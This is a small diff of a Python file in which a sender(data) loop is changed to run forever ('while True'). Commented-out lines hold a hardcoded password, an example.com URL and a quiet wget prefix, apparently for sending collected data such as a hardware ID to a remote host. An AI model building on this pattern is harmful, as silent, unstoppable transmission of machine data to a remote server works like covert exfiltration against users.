@@ -30,7 +30,7 @@ def get_hwid():
 
 
 def sender(data):
-    while run_sender:
+    while True:
         # psw="secret"
         # url='http://example.com/dat?'
         # wget='wget -q -O - '
